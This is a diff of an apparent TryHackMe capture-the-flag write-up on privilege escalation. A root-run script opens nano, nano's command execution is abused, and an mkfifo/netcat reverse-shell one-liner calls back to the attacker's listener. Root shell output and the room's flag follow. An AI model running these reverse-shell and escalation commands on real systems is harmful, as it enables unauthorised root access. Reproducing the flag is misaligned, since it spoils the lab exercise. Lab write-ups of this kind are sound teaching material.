@@ -134,18 +134,32 @@ case $ans in
 esac
 ```
 Aha, so if i run it as root, and write "read" in the input box (which will the sh script provide) it will open a nano UI as root!<br>
-So basically if you have nano run as root, you can do anything, because nano lets you to execute system commands.
+So basically if you have nano run as root, you can do anything, because nano has a feature that lets you to execute system commands
 <br>
 <br>
 So press CTRL + R and then CTRL + X in nano's UI, this will allow us to execute programs, as root because nano is run as root
 <img src = "cmd.png"> 
 <br>
-I want to get a more stable shell, so we open a netcat session
+I want to get a more stable shell, so i open a netcat session
 ```
-└─$ ncat -nlvp 8002
+$ ncat -nlvp 8002
 ```
 So now execute this code in the prompt nano gave us:
 ```
 rm /tmp/f; mkfifo /tmp/f; nc <your_ip> 8002 < /tmp/f | /bin/sh >/tmp/f 2>&1
 ```
-<img src = "ncat_nano.png">
+Checking back on the netcat listener, it opened a shell as root!
+```
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:8002
+Ncat: Listening on 0.0.0.0:8002
+Ncat: Connection from 10.10.31.139:51202.
+
+root@ip-10-10-31-139:/home/mike# whoami
+root
+```
+And read the root.txt to get the flag for the final answer
+```
+root@ip-10-10-31-139:/home/mike# cat /root/root.txt
+THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
+```
